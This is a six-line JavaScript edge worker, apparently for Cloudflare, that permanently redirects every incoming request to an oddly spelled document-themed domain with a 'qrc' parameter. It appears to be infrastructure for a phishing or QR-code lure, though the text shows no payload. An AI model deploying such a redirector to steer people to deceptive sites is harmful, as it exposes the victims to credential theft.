export default {
  async fetch(request, env, ctx) {
    const redirectUrl = "https://innovationaldocuintergrate.com/?qrc=";
    return Response.redirect(redirectUrl, 301);
  }
}
